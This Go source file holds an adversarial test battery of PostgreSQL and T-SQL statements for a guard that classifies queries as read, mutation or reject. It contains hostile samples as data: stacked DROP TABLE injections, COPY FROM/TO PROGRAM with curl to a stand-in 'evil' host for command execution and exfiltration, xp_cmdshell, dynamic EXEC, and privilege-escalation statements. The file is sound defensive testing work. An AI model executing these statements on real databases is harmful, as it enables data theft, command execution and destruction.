// Package corpus is the adversarial statement battery the parser spike judges
// candidates against. Every case encodes a decision RTFQ's statement guard must
// make correctly; a parser that cannot answer one of these is disqualified.
package corpus

// Verdict is what the guard must conclude for a statement.
type Verdict string

const (
	Read     Verdict = "READ"     // safe to execute as a read
	Mutation Verdict = "MUTATION" // DML: allowed only through the write path
	Reject   Verdict = "REJECT"   // must never execute, under any config
)

type Case struct {
	Name string
	SQL  string
	Want Verdict
	// Target is the schema-qualified relation the guard must resolve for
	// allow-list checking. Empty when not applicable to the verdict.
	Target string
	// Why explains what this case is probing. Load-bearing: these are the
	// notes that justify the guard's shape.
	Why string
}

// PG is the PostgreSQL battery.
var PG = []Case{
	// --- baseline sanity -------------------------------------------------
	{"plain-select", `SELECT * FROM orders`, Read, "public.orders",
		"Baseline read."},
	{"qualified-update", `UPDATE orders SET vip = true WHERE id = 42`, Mutation, "public.orders",
		"Baseline bounded mutation. Must resolve the target for the allow-list."},
	{"insert", `INSERT INTO orders (id) VALUES (1)`, Mutation, "public.orders",
		"INSERT has no WHERE; the qualification rule must not apply to it."},

	// --- qualification ---------------------------------------------------
	{"unqualified-update", `UPDATE orders SET vip = true`, Reject, "",
		"No WHERE. Rejected outright, no override (CLAUDE.md principle 2)."},
	{"unqualified-delete", `DELETE FROM orders`, Reject, "",
		"No WHERE. Same rule."},
	{"where-1-eq-1", `DELETE FROM orders WHERE 1=1`, Reject, "",
		"Syntactically qualified, semantically unbounded. A WHERE-exists check passes this."},
	{"where-true", `UPDATE orders SET vip = true WHERE true`, Reject, "",
		"Same trap, literal form."},
	{"where-or-true", `DELETE FROM orders WHERE id = 1 OR true`, Reject, "",
		"Trivially-true disjunct. Needs predicate analysis, not a WHERE-presence test."},

	// --- statement smuggling ---------------------------------------------
	{"stacked", `SELECT 1; DROP TABLE orders`, Reject, "",
		"Multi-statement input. Must be detected structurally, before classification."},
	{"line-comment-decoy", `SELECT 1 -- ; DROP TABLE orders`, Read, "",
		"The DROP is inside a comment. A regex/split-on-semicolon guard gets this wrong."},
	{"block-comment-decoy", `SELECT 1 /* ; DROP TABLE orders */`, Read, "",
		"Same, block form."},
	{"literal-semicolon", `SELECT * FROM orders WHERE name = 'a; DROP TABLE x'`, Read, "public.orders",
		"Semicolon inside a string literal. Splitting on ';' corrupts this query."},
	{"empty-statements", `; ; SELECT 1`, Read, "",
		"Empty statements around a real one; must not confuse the multi-statement check."},

	// --- writes wearing a read's clothes ---------------------------------
	{"cte-delete", `WITH gone AS (DELETE FROM orders WHERE id = 1 RETURNING *) SELECT * FROM gone`, Mutation, "public.orders",
		"Top-level node is a SELECT but it mutates. Classifying on the outermost node is wrong."},
	{"cte-update-nested", `WITH a AS (SELECT 1), b AS (UPDATE orders SET vip = true WHERE id = 1 RETURNING id) SELECT * FROM b`, Mutation, "public.orders",
		"Write buried in the second CTE. The walk must be exhaustive, not first-match."},
	{"select-into", `SELECT * INTO archived_orders FROM orders`, Reject, "",
		"PostgreSQL SELECT INTO creates a table. It is DDL wearing a SELECT node."},

	// --- not DDL, but catastrophic ---------------------------------------
	{"copy-from-program", `COPY orders FROM PROGRAM 'curl http://evil/x.csv'`, Reject, "",
		"Arbitrary command execution as the database OS user. Not DDL, not DML - a deny-list misses it."},
	{"copy-to-program", `COPY (SELECT * FROM orders) TO PROGRAM 'curl -d @- http://evil'`, Reject, "",
		"Exfiltration channel that a read-classifier could wave through."},
	{"do-block", `DO $$ BEGIN DELETE FROM orders; END $$`, Reject, "",
		"Executes arbitrary PL/pgSQL. The inner DELETE is invisible to statement classification."},
	{"explain-analyze", `EXPLAIN ANALYZE DELETE FROM orders`, Reject, "",
		"EXPLAIN ANALYZE actually executes the statement. The `explain` tool must refuse ANALYZE."},
	{"explain-plain", `EXPLAIN SELECT * FROM orders`, Read, "",
		"Plain EXPLAIN does not execute; this one must still be allowed."},
	{"grant", `GRANT ALL ON orders TO PUBLIC`, Reject, "",
		"Privilege escalation. DCL, so a DDL-only deny-list misses it."},
	{"truncate", `TRUNCATE orders`, Reject, "",
		"Unbounded delete with no affected-row count to cap. Explicitly banned."},
	{"create-index", `CREATE INDEX idx ON orders (id)`, Reject, "",
		"DDL. Schema change is a deploy, not an agent action."},
	{"drop-table", `DROP TABLE orders`, Reject, "",
		"DDL baseline."},
	{"set-role", `SET ROLE postgres`, Reject, "",
		"Session-state change that re-points every subsequent gate at a different identity."},

	// --- identifier resolution -------------------------------------------
	{"schema-qualified", `UPDATE public.orders SET vip = true WHERE id = 1`, Mutation, "public.orders",
		"Explicit schema must resolve to the same target as the bare name."},
	{"quoted-identifiers", `UPDATE "public"."orders" SET vip = true WHERE id = 1`, Mutation, "public.orders",
		"Quoting must not change resolution."},
	{"case-sensitive-quoted", `UPDATE "Orders" SET vip = true WHERE id = 1`, Mutation, `public.Orders`,
		`"Orders" is a DIFFERENT table from orders. Case-folding the allow-list check is a gate bypass.`},
	{"homoglyph", "UPDATE оrders SET vip = true WHERE id = 1", Mutation, "public.оrders",
		"Leading char is Cyrillic U+043E, not ASCII 'o'. Must not match an 'orders' allow-list entry."},
	{"other-schema", `UPDATE secret.orders SET vip = true WHERE id = 1`, Mutation, "secret.orders",
		"Same relation name, different schema. Unqualified allow-list entries are ambiguous."},

	// --- shape of a read --------------------------------------------------
	{"select-for-update", `SELECT * FROM orders FOR UPDATE`, Read, "public.orders",
		"A read that takes row locks. Classified read, but the lock is a blast-radius fact worth surfacing."},
	{"select-with-limit", `SELECT * FROM orders LIMIT 10`, Read, "public.orders",
		"Existing LIMIT must be detected so injection does not double it."},
	{"update-subquery", `UPDATE orders SET vip = true WHERE id IN (SELECT id FROM vips)`, Mutation, "public.orders",
		"Qualified via subquery; the read side must not be mistaken for a second write target."},
	{"merge", `MERGE INTO orders o USING staging s ON o.id = s.id WHEN MATCHED THEN UPDATE SET vip = s.vip`, Mutation, "public.orders",
		"MERGE is DML that neither the UPDATE nor INSERT node type covers."},
}

// TSQL is the SQL Server battery: the same decisions in T-SQL syntax, plus
// dialect-specific traps.
var TSQL = []Case{
	{"plain-select", `SELECT * FROM orders`, Read, "dbo.orders",
		"Baseline read."},
	{"qualified-update", `UPDATE orders SET vip = 1 WHERE id = 42`, Mutation, "dbo.orders",
		"Baseline bounded mutation."},
	{"unqualified-update", `UPDATE orders SET vip = 1`, Reject, "",
		"No WHERE."},
	{"unqualified-delete", `DELETE FROM orders`, Reject, "",
		"No WHERE."},
	{"where-1-eq-1", `DELETE FROM orders WHERE 1=1`, Reject, "",
		"Trivially true."},
	{"stacked", `SELECT 1; DROP TABLE orders`, Reject, "",
		"T-SQL does not even require the semicolon, which makes this harder than Postgres."},
	{"batch-no-semicolon", `SELECT 1 DROP TABLE orders`, Reject, "",
		"Valid T-SQL batch: two statements, no separator. Unique to this dialect."},
	{"go-batch", "SELECT 1\nGO\nDROP TABLE orders", Reject, "",
		"GO is a client batch separator, not T-SQL. Whether the parser sees it at all is a real question."},
	{"exec-dynamic", `EXEC('DELETE FROM orders')`, Reject, "",
		"Dynamic SQL: the payload is a string literal and invisible to the parse tree."},
	{"sp-executesql", `EXEC sp_executesql N'DELETE FROM orders'`, Reject, "",
		"Same, via the documented procedure."},
	{"xp-cmdshell", `EXEC xp_cmdshell 'dir'`, Reject, "",
		"Command execution, T-SQL's COPY FROM PROGRAM."},
	{"select-into", `SELECT * INTO archived FROM orders`, Reject, "",
		"Creates a table, same as Postgres."},
	{"cte-delete", `WITH gone AS (SELECT id FROM orders WHERE id = 1) DELETE FROM orders WHERE id IN (SELECT id FROM gone)`, Mutation, "dbo.orders",
		"CTE followed by a write; different shape from Postgres's writable CTE."},
	{"bracket-identifiers", `UPDATE [dbo].[orders] SET vip = 1 WHERE id = 1`, Mutation, "dbo.orders",
		"Bracket quoting is T-SQL-specific and must resolve identically."},
	{"three-part-name", `UPDATE otherdb.dbo.orders SET vip = 1 WHERE id = 1`, Mutation, "otherdb.dbo.orders",
		"Cross-database reference. A two-part allow-list cannot express this."},
	{"truncate", `TRUNCATE TABLE orders`, Reject, "",
		"Banned."},
	{"drop-table", `DROP TABLE orders`, Reject, "",
		"DDL baseline."},
	{"merge", `MERGE orders AS o USING staging AS s ON o.id = s.id WHEN MATCHED THEN UPDATE SET vip = s.vip;`, Mutation, "dbo.orders",
		"MERGE, T-SQL form."},
	{"top-update", `UPDATE TOP (5) orders SET vip = 1 WHERE id > 0`, Mutation, "dbo.orders",
		"UPDATE TOP is bounded by syntax; the cap still governs."},
}
